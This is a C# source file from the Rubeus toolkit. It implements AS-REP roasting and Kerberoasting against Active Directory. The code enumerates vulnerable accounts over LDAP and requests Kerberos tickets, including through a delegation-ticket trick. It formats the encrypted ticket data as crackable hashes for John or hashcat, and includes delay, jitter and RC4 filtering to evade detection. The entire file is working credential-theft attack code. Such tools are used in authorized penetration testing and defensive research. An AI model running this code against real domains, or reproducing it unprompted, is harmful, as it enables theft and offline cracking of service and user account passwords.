using System;
using Asn1;
using System.IO;
using ConsoleTables;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using Rubeus.lib.Interop;
using Rubeus.Domain;

namespace Rubeus
{
    public class Roast
    {

        public enum HashFormat
        {
            john,
            hashcat
        }

        //TODO: Support as-rep roasting without requiring credentials if the user specifies usernames to get TGTs for

        public static List<AsRepRoastResult> ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", HashFormat format = HashFormat.john, System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
        {
            List<AsRepRoastResult> results = new List<AsRepRoastResult>();
            if (!String.IsNullOrEmpty(userName))
            {
                Console.WriteLine("[*] Target User            : {0}", userName);
            }
            if (!String.IsNullOrEmpty(OUName))
            {
                Console.WriteLine("[*] Target OU              : {0}", OUName);
            }
            if (!String.IsNullOrEmpty(domain))
            {
                Console.WriteLine("[*] Target Domain          : {0}", domain);
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                Console.WriteLine("[*] Target DC              : {0}", domainController);
            }

            Console.WriteLine();

            if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
            {
                // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                AsRepRoastResult singleResult = new AsRepRoastResult();
                singleResult.Username = userName;
                singleResult.HashData = GetASRepHash(userName, domain, domainController, format, outFile);
                singleResult.DistinguishedName = string.Empty;
                results.Add(singleResult);
            }
            else
            {
                string userSearchFilter = "";

                if (String.IsNullOrEmpty(userName))
                {
                    userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                }
                else
                {
                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
                }
                if (!String.IsNullOrEmpty(ldapFilter))
                {
                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                }

                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                }
                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);

                if (users == null || users.Count == 0)
                {
                    Console.WriteLine("[X] No users found to AS-REP roast!");
                }

                foreach (IDictionary<string, Object> user in users)
                {

                    string samAccountName = (string)user["samaccountname"];
                    string distinguishedName = (string)user["distinguishedname"];
                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                    AsRepRoastResult currentResult = new AsRepRoastResult();
                    currentResult.Username = samAccountName;
                    currentResult.DistinguishedName = distinguishedName;
                    try
                    {
                        currentResult.HashData = GetASRepHash(samAccountName, domain, domainController, format, outFile);
                    }
                    catch (Exception ex)
                    {
                        currentResult.HashData = new TicketHash("Error: " + ex.Message, Interop.KERB_ETYPE.unknown);
                    }
                    results.Add(currentResult);
                }
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
            }
            return results;
        }

        /// <summary>
        /// Roast AS-REPs for users without pre-authentication enabled
        /// </summary>
        public static TicketHash GetASRepHash(string userName, string domain, string domainController = "", HashFormat format = HashFormat.john, string outFile = "")
        {
            string dcIP = Networking.GetDCIP(domainController, true, domain);
            if (String.IsNullOrEmpty(dcIP))
            {
                throw new RubeusException("Failed to get IP address for domain controller " + domainController);
            }

            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (response == null)
            {
                throw new RubeusException("AS-REQ sent for " + userName + " but no response received from server (" + dcIP + ")");
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                Console.WriteLine("[+] AS-REQ w/o preauth successful!");

                // parse the response to an AS-REP
                AS_REP rep = new AS_REP(response);

                // output the hash of the encrypted KERB-CRED in a crackable hash form
                string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
                repHash = repHash.Insert(32, "$");

                string hashString = "";
                if (format == HashFormat.john)
                {
                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                }
                else if (format == HashFormat.hashcat)
                {
                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                }
                else
                {
                    throw new RubeusException("Please provide a cracking format.");
                }

                if (!String.IsNullOrEmpty(outFile))
                {
                    string outFilePath = Path.GetFullPath(outFile);
                    try
                    {
                        File.AppendAllText(outFilePath, hashString + Environment.NewLine);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception: {0}", e.Message);
                    }
                    Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                }
                else
                {
                    Console.WriteLine("[*] AS-REP hash:\r\n");

                    // display the base64 of a hash, columns of 80 chararacters
                    if (Rubeus.Program.wrapTickets)
                    {
                        foreach (string line in Helpers.Split(hashString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", hashString);
                    }
                    Console.WriteLine();
                }
                return new TicketHash(hashString,Interop.KERB_ETYPE.rc4_hmac);
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw KerberosException.FromNativeError(error);
            }
            else // If the response tag was neither AS_REP or ERROR
            {
                throw new RubeusException(String.Format("Unknown application tag: {0}", responseTag));
            }
        }

        public static List<KerberoastResult> Kerberoast(KerberoastSettings settings)
        {
            List<KerberoastResult> results = new List<KerberoastResult>();
            // Create local variables for any settings that may get modified by this function so we don't modify what the caller passed in
            string domain = settings.Domain.DomainName;
            string dc = settings.Domain.DomainController;
            KRB_CRED TGT = settings.Tgt;
            string pwdSetAfter = settings.PasswordSetAfter;
            string pwdSetBefore = settings.PasswordSetBefore;

            if (settings.NoTgsRequests)
            {
                Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");
            }
            else if (TGT != null)
            {
                Console.WriteLine("[*] Using a TGT /ticket to request service tickets");
            }
            else if (settings.UseTgtDelegationTrick || settings.EncryptionMode == KerberoastSettings.ETypeMode.Rc4Opsec)
            {
                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user");
                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                TGT = new KRB_CRED(delegTGTbytes);
                Console.WriteLine("[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else");
            }
            else
            {
                Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
            }

            if (settings.Enterprise && ((TGT == null) || ((settings.Spns != null) && (settings.Spns.Count == 0))))
            {
                throw new RubeusException("To use Enterprise Principals, at least one SPN must be be specified, along with a TGT from file/base64 (or TGT delegation trick)");
            }

            if (settings.Delay != 0)
            {
                Console.WriteLine($"[*] Using a delay of {settings.Delay} milliseconds between TGS requests.");
                if (settings.Jitter != 0)
                {
                    Console.WriteLine($"[*] Using a jitter of {settings.Jitter}% between TGS requests.");
                }
                Console.WriteLine();
            }

            if ((settings.Spns != null) && (settings.Spns.Count != 0))
            {
                foreach (string spn in settings.Spns)
                {
                    Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);
                    KerberoastResult result = new KerberoastResult();
                    result.ServicePrincipalName = spn;
                    try
                    {
                        if (TGT != null)
                        {
                            // if a TGT .kirbi is supplied, use that for the request
                            //      this could be a passed TGT or if TGT delegation is specified
                            result.HashData = GetTGSRepHashWithTgt(TGT, spn, "USER", "DISTINGUISHEDNAME", settings.OutputFilePath, settings.SimpleOutput, settings.Enterprise, dc,
                                                                    Interop.KERB_ETYPE.rc4_hmac);
                        }
                        else
                        {
                            // otherwise use the KerberosRequestorSecurityToken method
                            result.HashData = GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", settings.Domain.Credentials, settings.OutputFilePath);
                        }
                    }
                    catch (Exception ex)
                    {
                        result.HashData = new TicketHash("Error: " + ex.Message,Interop.KERB_ETYPE.unknown);
                    }
                    results.Add(result);
                }
            }
            else
            {
                if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(settings.OuPath)) || (!String.IsNullOrEmpty(settings.Username)))
                {
                    if (!String.IsNullOrEmpty(settings.Username))
                    {
                        if (settings.Username.Contains(","))
                        {
                            Console.WriteLine("[*] Target Users           : {0}", settings.Username);
                        }
                        else
                        {
                            Console.WriteLine("[*] Target User            : {0}", settings.Username);
                        }
                    }
                    if (!String.IsNullOrEmpty(domain))
                    {
                        Console.WriteLine("[*] Target Domain          : {0}", domain);
                    }
                    if (!String.IsNullOrEmpty(settings.OuPath))
                    {
                        Console.WriteLine("[*] Target OU              : {0}", settings.OuPath);
                    }
                }

                // inject ticket for LDAP search if supplied
                if (TGT != null)
                {
                    byte[] kirbiBytes = null;
                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;

                    if (String.IsNullOrEmpty(domain))
                    {
                        // if a domain isn't specified, use the domain from the referral
                        domain = ticketDomain;
                    }

                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher
                    if (ticketDomain != domain)
                    {
                        if (String.IsNullOrEmpty(dc))
                        {
                            dc = Networking.GetDCName(domain);
                        }

                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
                        Ticket ticket = TGT.tickets[0];
                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

                        // check if we've been given an IP for the DC, we'll need the name for the LDAP service ticket
                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\d{1,3}\.){3}\d{1,3}");
                        if (match.Success)
                        {
                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);
                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
                            dc = dcInfo.HostName;
                        }

                        // request a service tickt for LDAP on the target DC
                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, settings.Enterprise, false);
                    }
                    // otherwise inject the TGT to perform the domain searcher
                    else
                    {
                        kirbiBytes = TGT.Encode().Encode();
                    }
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                // build LDAP query
                string userFilter = "";

                if (!String.IsNullOrEmpty(settings.Username))
                {
                    if (settings.Username.Contains(","))
                    {
                        // searching for multiple specified users, ensuring they're not disabled accounts
                        string userPart = "";
                        foreach (string user in settings.Username.Split(','))
                        {
                            userPart += String.Format("(samAccountName={0})", user);
                        }
                        userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
                    }
                    else
                    {
                        // searching for a specified user, ensuring it's not a disabled account
                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", settings.Username);
                    }
                }
                else
                {
                    // if no user specified, filter out the krbtgt account and disabled accounts
                    userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                }

                string encFilter = "";
                if (settings.EncryptionMode == KerberoastSettings.ETypeMode.Rc4Opsec)
                {
                    // "opsec" RC4, meaning don't RC4 roast accounts that support AES
                    Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
                    encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                }
                else if (settings.EncryptionMode == KerberoastSettings.ETypeMode.Aes)
                {
                    // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                }

                // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
                //       then RC4 tickets would NOT be returned, so the original filter was:
                //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
                //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
                //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
                //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";

                //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
                //      so this fine-grained filtering is not needed

                string userSearchFilter = "";
                if (!(String.IsNullOrEmpty(settings.PasswordSetAfter) & String.IsNullOrEmpty(settings.PasswordSetBefore)))
                {
                    if (String.IsNullOrEmpty(settings.PasswordSetAfter))
                    {
                        pwdSetAfter = "01-01-1601";
                    }
                    if (String.IsNullOrEmpty(settings.PasswordSetBefore))
                    {
                        pwdSetBefore = "01-01-2100";
                    }

                    Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);

                    try
                    {
                        DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
                        DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
                        string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
                    }
                    catch
                    {
                        throw new RubeusException(String.Format("Error parsing /pwdsetbefore or /pwdsetafter, please use the format 'MM-dd-yyyy'"));
                    }
                }
                else
                {
                    userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
                }

                if (!String.IsNullOrEmpty(settings.LdapFilter))
                {
                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, settings.LdapFilter);
                }

                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(settings.Domain.Credentials, settings.OuPath, dc, domain, userSearchFilter, settings.Domain.Ldaps);
                if (users == null)
                {
                    throw new RubeusException("LDAP query failed, try specifying more domain information or specific SPNs.");
                }

                try
                {
                    if (users.Count == 0)
                    {
                        Console.WriteLine("\r\n[X] No users found to Kerberoast!");
                    }
                    else
                    {
                        Console.WriteLine("\r\n[*] Total kerberoastable users : {0}\r\n", users.Count);
                    }

                    // used to keep track of user encryption types
                    SortedDictionary<Interop.SUPPORTED_ETYPE, int> userETypes = new SortedDictionary<Interop.SUPPORTED_ETYPE, int>();
                    // used to keep track of years that users had passwords last set in
                    SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();

                    foreach (IDictionary<string, Object> user in users)
                    {
                        KerberoastResult roastResult = new KerberoastResult();
                        string samAccountName = (string)user["samaccountname"];
                        string distinguishedName = (string)user["distinguishedname"];
                        string servicePrincipalName = ((string[])user["serviceprincipalname"])[0];
                        roastResult.Username = samAccountName;
                        roastResult.DistinguishedName = distinguishedName;
                        roastResult.ServicePrincipalName = servicePrincipalName;

                        DateTime? pwdLastSet = null;
                        if (user.ContainsKey("pwdlastset"))
                        {
                            pwdLastSet = ((DateTime)user["pwdlastset"]).ToLocalTime();
                            roastResult.PasswordLastSet = pwdLastSet;
                        }

                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                        if (user.ContainsKey("msds-supportedencryptiontypes"))
                        {
                            supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];
                            roastResult.SupportedEncryption = supportedETypes;
                        }

                        if (!userETypes.ContainsKey(supportedETypes))
                        {
                            userETypes[supportedETypes] = 1;
                        }
                        else
                        {
                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
                        }

                        if (pwdLastSet == null)
                        {
                            // pwdLastSet == null with new accounts and
                            // when a password is set to never expire
                            if (!userPWDsetYears.ContainsKey(-1))
                                userPWDsetYears[-1] = 1;
                            else
                                userPWDsetYears[-1] += 1;
                        }
                        else
                        {
                            int year = pwdLastSet.Value.Year;
                            if (!userPWDsetYears.ContainsKey(year))
                                userPWDsetYears[year] = 1;
                            else
                                userPWDsetYears[year] += 1;
                        }

                        if (!settings.NoTgsRequests)
                        {
                            if (!settings.SimpleOutput)
                            {
                                Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                                Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                                Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
                                Console.WriteLine("[*] PwdLastSet             : {0}", pwdLastSet);
                                Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
                            }

                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                            {
                                servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
                            }

                            // if a TGT .kirbi is supplied, use that for the request
                            //      this could be a passed TGT or if TGT delegation is specified
                            bool tgsFailed = false;
                            if (TGT != null)
                            {
                                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
                                if (settings.EncryptionMode == KerberoastSettings.ETypeMode.Aes &&
                                                                (((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
                                                                ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)))
                                {
                                    etype = Interop.KERB_ETYPE.rc4_hmac;
                                }

                                try
                                {
                                    roastResult.HashData = GetTGSRepHashWithTgt(TGT, servicePrincipalName, samAccountName, distinguishedName, settings.OutputFilePath, settings.SimpleOutput,
                                                                                settings.Enterprise, dc, etype);
                                }
                                catch (Exception ex)
                                {
                                    tgsFailed = true;
                                    roastResult.HashData = new TicketHash("ERROR: " + ex.Message, Interop.KERB_ETYPE.unknown);
                                }
                                Helpers.RandomDelayWithJitter(settings.Delay, settings.Jitter);
                                if (tgsFailed && settings.AutoEnterprise)
                                {
                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                    roastResult.HashData = GetTGSRepHashWithTgt(TGT, servicePrincipalName, samAccountName, distinguishedName, settings.OutputFilePath, settings.SimpleOutput, true, dc, etype);
                                    Helpers.RandomDelayWithJitter(settings.Delay, settings.Jitter);
                                }
                            }
                            else // No TGT supplied so use the KerberosRequestorSecurityToken method instead
                            {
                                try
                                {
                                    roastResult.HashData = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, settings.Domain.Credentials, settings.OutputFilePath, settings.SimpleOutput);
                                }
                                catch (Exception ex)
                                {
                                    tgsFailed = true;
                                    roastResult.HashData = new TicketHash("ERROR: " + ex.Message, Interop.KERB_ETYPE.unknown);
                                }
                                Helpers.RandomDelayWithJitter(settings.Delay, settings.Jitter);
                                if (tgsFailed && settings.AutoEnterprise)
                                {
                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                    roastResult.HashData = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, settings.Domain.Credentials, settings.OutputFilePath, settings.SimpleOutput);
                                    Helpers.RandomDelayWithJitter(settings.Delay, settings.Jitter);
                                }
                            }
                        } // !userstats
                        results.Add(roastResult);
                    } // foreach

                    if (settings.NoTgsRequests)
                    {
                        var eTypeTable = new ConsoleTable("Supported Encryption Type", "Count");
                        var pwdLastSetTable = new ConsoleTable("Password Last Set Year", "Count");
                        Console.WriteLine();

                        // display stats about the users found
                        foreach (var item in userETypes)
                        {
                            eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        eTypeTable.Write();

                        foreach (var item in userPWDsetYears)
                        {
                            pwdLastSetTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        pwdLastSetTable.Write();
                    }
                }
                catch (Exception ex)
                {
                    throw new RubeusException(String.Format("Error executing the domain searcher: {0}", ex));
                }
            }

            if (!String.IsNullOrEmpty(settings.OutputFilePath))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(settings.OutputFilePath));
            }
            return results;
        }

        public static TicketHash GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
        {
            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach

            TicketHash hashData = new TicketHash();
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
                //  GetRequest() stream was constributed to PowerView by @machosec
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                if (cred != null)
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                }
                byte[] requestBytes = ticket.GetRequest();

                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                {
                    throw new RubeusException("GSSAPI inner token is not an AP_REQ");
                }

                // ignore the GSSAPI frame
                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);

                if (apRep.TagValue != 14)
                {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }

                long encType = 0;

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                        hashData.Encryption = (Interop.KERB_ETYPE)encType;
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                            //Ensure checksum is extracted from the end for aes keys
                                            int checksumStart = cipherText.Length - 24;
                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                        //if encType==23
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }
                                        hashData.Hash = hash;

                                        if (!String.IsNullOrEmpty(outFile))
                                        {
                                            string outFilePath = Path.GetFullPath(outFile);
                                            try
                                            {
                                                File.AppendAllText(outFilePath, hash + Environment.NewLine);
                                            }
                                            catch (Exception e)
                                            {
                                                Console.WriteLine("Exception: {0}", e.Message);
                                            }
                                            Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                                        }
                                        else if (simpleOutput)
                                        {
                                            Console.WriteLine(hash);
                                        }
                                        else
                                        {
                                            if (Rubeus.Program.wrapTickets)
                                            {
                                                bool header = false;
                                                foreach (string line in Helpers.Split(hash, 80))
                                                {
                                                    if (!header)
                                                    {
                                                        Console.WriteLine("[*] Hash                   : {0}", line);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("                             {0}", line);
                                                    }
                                                    header = true;
                                                }
                                            }
                                            else
                                            {
                                                Console.WriteLine("[*] Hash                   : {0}", hash);
                                            }
                                            Console.WriteLine();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    throw new RubeusException(String.Format("Error during request for SPN {0} : {1}", spn, ex.InnerException.Message));
                }
                else
                {
                    throw new RubeusException(String.Format("Error during request for SPN {0} : {1}", spn, ex.Message));
                }

            }
            return hashData;
        }

        public static TicketHash GetTGSRepHashWithTgt(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
        {
            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
            string userDomain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            // extract out the info needed for the TGS-REQ request
            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
            string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();
            Ticket ticket = TGT.tickets[0];
            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

            // request the new service ticket
            byte[] tgsBytes = null;
            bool sameDomain = true;
            if (domain.ToLower() != userDomain.ToLower())
            {
                sameDomain = false;
            }
            tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, sameDomain);

            if (tgsBytes != null)
            {
                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
                return DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
            }
            else
            {
                throw new RubeusException("TGS request sent but did not recieve response from server");
            }
        }

        public static TicketHash DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
        {
            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form

            int encType = cred.tickets[0].enc_part.etype;
            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());

            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);

            string hash = "";
            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
            if ((encType == 18) || (encType == 17))
            {
                int checksumStart = cipherText.Length - 24;
                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
            }
            //if encType==23
            else
            {
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                string outFilePath = Path.GetFullPath(outFile);
                try
                {
                    File.AppendAllText(outFilePath, hash + Environment.NewLine);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e.Message);
                }
                Console.WriteLine("[*] Hash written to {0}", outFilePath);
            }
            else if (simpleOutput)
            {
                Console.WriteLine(hash);
            }
            else
            {
                bool header = false;
                if (Rubeus.Program.wrapTickets)
                {
                    foreach (string line in Helpers.Split(hash, 80))
                    {
                        if (!header)
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("[*] Hash                   : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("  Kerberoast Hash       :  {0}", line);
                            }
                        }
                        else
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("                             {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                           {0}", line);
                            }
                        }
                        header = true;
                    }
                }
                else
                {
                    if (kerberoastDisplay)
                    {
                        Console.WriteLine("[*] Hash                   : {0}", hash);
                    }
                    else
                    {
                        Console.WriteLine("  Kerberoast Hash       :  {0}", hash);
                    }
                }
            }

            return new TicketHash(hash, (Interop.KERB_ETYPE)encType);
        }
    }
}
